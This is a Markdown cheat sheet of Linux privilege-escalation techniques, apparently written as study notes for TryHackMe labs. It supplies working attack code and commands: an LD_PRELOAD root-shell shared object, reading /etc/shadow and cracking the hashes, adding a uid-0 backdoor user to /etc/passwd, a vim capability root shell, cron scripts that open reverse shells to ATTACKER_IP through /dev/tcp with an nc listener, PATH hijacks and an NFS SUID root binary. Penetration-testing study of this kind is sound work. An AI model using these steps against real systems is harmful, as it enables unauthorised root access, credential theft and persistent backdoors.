# 🛡️ Linux Privilege Escalation – Core Techniques

> **Author:** Obada Hamed  
> **Scope:** Post-exploitation privilege escalation on Linux systems using common vectors.  
> **Focus:** Enumeration, Sudo, SUID, Capabilities

---

## 📍 1. Enumeration

**Goal:** After gaining initial access (often as a low-privileged user), the first step is to enumerate the system to discover potential privilege escalation vectors.

### 🔧 Key Commands

| Command | Description |
|---------|-------------|
| `hostname` | Displays the system's hostname. May hint at the machine's role. |
| `uname -a` | Shows kernel and system architecture info. Useful for kernel exploit checks. |
| `cat /proc/version` | Kernel version and compiler info (e.g., GCC presence). |
| `cat /etc/issue` | OS identification (can be customized). |
| `ps aux`, `ps -A`, `ps axjf` | Lists running processes. Look for unusual or high-privilege processes. |
| `env` | Displays environment variables. Check for PATH, Python, GCC, etc. |
| `sudo -l` | Lists commands the current user can run with sudo. |
| `ls -la` | Lists files, including hidden ones, with permissions. |
| `id` | Shows current user ID and group memberships. |
| `cat /etc/passwd` | Lists system users. Use `grep /home` to filter real users. |
| `history` | View command history. May reveal credentials or useful commands. |
| `ifconfig`, `ip route` | Network interfaces and routing info. Useful for pivoting. |
| `netstat -a`, `-l`, `-tp` | Active connections and listening ports. |
| `find` | Search for files, permissions, SUID, writable folders, etc. |

---

## 🔐 2. Privilege Escalation via `sudo`

### 🔍 Check Permissions

```bash
sudo -l
```
Look for commands that can be run without a password (NOPASSWD) or with environment variables preserved.

🧪 Exploiting LD_PRELOAD
If LD_PRELOAD is allowed and a binary like find is available via sudo, you can preload a malicious shared object to escalate privileges.

1. Create the C payload:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
2. Compile to shared object:
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
3. Execute with sudo:
```bash
sudo LD_PRELOAD=/full/path/to/shell.so find
```
⚠️ Ensure the binary is allowed in sudo -l and that env_keep+=LD_PRELOAD is enabled.

🧨 3. Privilege Escalation via SUID
🔍 Find SUID Binaries
```bash
find / -type f -perm -04000 -ls 2>/dev/null
```
✅ Exploit Known Binaries
Use GTFOBins – SUID to check if any of the binaries are exploitable.

Example: nano with SUID
```bash
nano /etc/shadow
```
You can now read password hashes.

🧂 Crack Passwords with John the Ripper
```bash
unshadow passwd.txt shadow.txt > passwords.txt
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
```
🧨 Add a Root User (Alternative to Cracking)
Generate a password hash:

```bash
openssl passwd -1 -salt aqua mypassword
```
Add a new user to /etc/passwd:

```bash
nano /etc/passwd
Append:
```
```Code
aqua:<hash>:0:0:root:/root:/bin/bash
```
Switch to the new user:
```bash
su aqua
```
⚙️ 4. Privilege Escalation via Capabilities
Linux capabilities allow fine-grained privilege assignment to binaries without full root access.

🔍 Find Capabilities
```bash
getcap -r / 2>/dev/null
```
✅ Exploit Known Capable Binaries
Check GTFOBins – Capabilities (gtfobins.github.io in Bing) for exploitable binaries.

Example: vim with cap_setuid+ep
```bash
vim -c ':py3 import os; os.setuid(0); os.system("/bin/bash")'
```
This spawns a root shell if the binary is owned by root and has the right capabilit.

---

## 🧨 5. Privilege Escalation via Cron Jobs

**Cron jobs** are scheduled tasks that run scripts or binaries at specific times. If a cron job runs as **root** and executes a script that is **writable by a low-privileged user**, it becomes a perfect escalation vector.

### 🔍 Check for Cron Jobs

```bash
cat /etc/crontab
ls -la /etc/cron.*
```
Look for:

Scripts running as root

Writable scripts or missing scripts

PATH misconfigurations

🧪 Scenario 1: Writable Script
If /etc/crontab contains:

```Code
* * * * * root /home/karen/backup.sh
```
And backup.sh is writable:

```bash
echo '#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' > /home/karen/backup.sh
chmod +x /home/karen/backup.sh
```
Start a listener:

```bash
nc -lvnp PORT
```
Wait for the cron job to trigger and spawn a root shell.

🧨 Scenario 2: Missing Script (PATH Hijack via Cron)
If crontab contains:

```Code
* * * * * root antivirus.sh
```
And the script is missing, but no full path is specified:

Check PATH in crontab:

```bash
cat /etc/crontab | grep PATH
```
Create a fake script in a writable PATH directory (e.g., /home/karen):

```bash
echo '#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' > /home/karen/antivirus.sh
chmod +x /home/karen/antivirus.sh
```
Wait for the cron job to execute your script as root.

🧱 6. Privilege Escalation via PATH Hijacking
If a SUID binary or root-owned script calls another binary without a full path, and you can control the PATH, you can hijack the execution.

🔍 Check PATH
```bash
echo $PATH
```
🔍 Find Writable Directories
```bash
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```
If no writable directories are in PATH, prepend one:

```bash
export PATH=/tmp:$PATH
```
🧪 Create Fake Binary
```bash
cp /bin/bash /tmp/thm
chmod +x /tmp/thm
```
If a SUID script calls thm, it will now execute /tmp/thm with root privileges.

🌐 7. Privilege Escalation via NFS (no_root_squash)
If the target system exports an NFS share with the no_root_squash option, and you can mount it, you can create a SUID binary that executes as root.

🔍 Enumerate NFS Shares
```bash
showmount -e TARGET_IP
```
🔗 Mount the Share
```bash
mkdir /tmp/nfs
sudo mount -o rw TARGET_IP:/shared/folder /tmp/nfs
```
🧱 Create SUID Binary
```c
// nfs.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
```
```bash
gcc nfs.c -o /tmp/nfs/rootme
chmod +s /tmp/nfs/rootme
```
🚀 Execute on Target
```bash
/shared/folder/rootme
```
You now have a root shell.

📚 References
GTFOBins (Official)

GTFOBins (Mirror)

TryHackMe – Privilege Escalation Rooms

Linux Capabilities – man page (man7.org in Bing)

Stay sharp, stay ethical, and document everything.  
